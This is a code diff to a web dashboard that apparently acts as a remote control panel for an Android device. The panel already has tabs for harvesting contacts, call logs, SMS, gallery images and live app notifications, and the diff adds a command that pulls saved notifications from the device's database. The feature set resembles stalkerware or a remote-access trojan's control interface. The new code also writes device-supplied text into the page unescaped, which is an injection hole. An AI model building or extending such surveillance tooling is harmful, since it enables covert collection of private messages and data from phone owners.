@@ -509,7 +509,10 @@
             <!-- Real-Time Push Tab -->
             <div id="notificationsView" style="display:none;">
                 <div class="card">
-                    <h2><span><i class="fas fa-bolt"></i> Real-time Push Feed</span></h2>
+                    <h2>
+                        <span><i class="fas fa-bolt"></i> Real-time Push & Saved Notifications</span>
+                        <button class="btn btn-sm" onclick="loadSavedNotifications()"><i class="fas fa-rotate"></i> Sync DB</button>
+                    </h2>
                     <div id="notificationsList" class="list-container">
                         <p style="text-align:center; color:var(--text-muted); padding: 20px;">Listening for live incoming SMS & app notifications...</p>
                     </div>
@@ -826,6 +829,29 @@
                 list.prepend(card);
                 log(`LIVE Notification: ${msg.data.appName}`);
             }
+            else if (msg.type === 'saved_notifications_list') {
+                const raw = msg.data ? (msg.data.data || msg.data) : [];
+                const notifs = typeof raw === 'string' ? JSON.parse(raw) : raw;
+                const list = document.getElementById('notificationsList');
+                list.innerHTML = '';
+                if (!notifs || notifs.length === 0) {
+                    list.innerHTML = '<p style="text-align:center; color:var(--text-muted); padding:20px;">No saved notifications in DB.</p>';
+                } else {
+                    notifs.forEach(n => {
+                        const card = document.createElement('div');
+                        card.className = 'data-card';
+                        card.style.borderColor = 'var(--card-border)';
+                        card.innerHTML = `
+                            <div class="data-title"><i class="fas fa-database" style="color:var(--primary);"></i> ${n.appName} (${n.packageName})</div>
+                            <div style="color:#ffffff; font-weight:600; margin:4px 0;">${n.title}</div>
+                            <div style="color:#cbd5e1; font-size:0.9em;">${n.text}</div>
+                            <div class="data-sub">${n.timestamp}</div>
+                        `;
+                        list.appendChild(card);
+                    });
+                }
+                log(`Loaded ${notifs ? notifs.length : 0} saved notifications from DB.`);
+            }
             else if (msg.type === 'gallery_list') {
                 const images = JSON.parse(msg.data.data);
                 const returnedOffset = parseInt(msg.data.offset) || 0;
@@ -894,7 +920,13 @@
         if (tab === 'contacts') loadContacts();
         if (tab === 'calls') loadCallLogs();
         if (tab === 'sms') loadSmsLogs();
+        if (tab === 'notifications') loadSavedNotifications();
         if (tab === 'gallery') loadGallery();
+    }
+
+    function loadSavedNotifications() {
+        document.getElementById('notificationsList').innerHTML = '<p style="text-align:center; color:var(--text-muted); padding: 20px;">Fetching saved notifications from DB...</p>';
+        sendCommand('get_saved_notifications');
     }
 
     function loadCallLogs() {
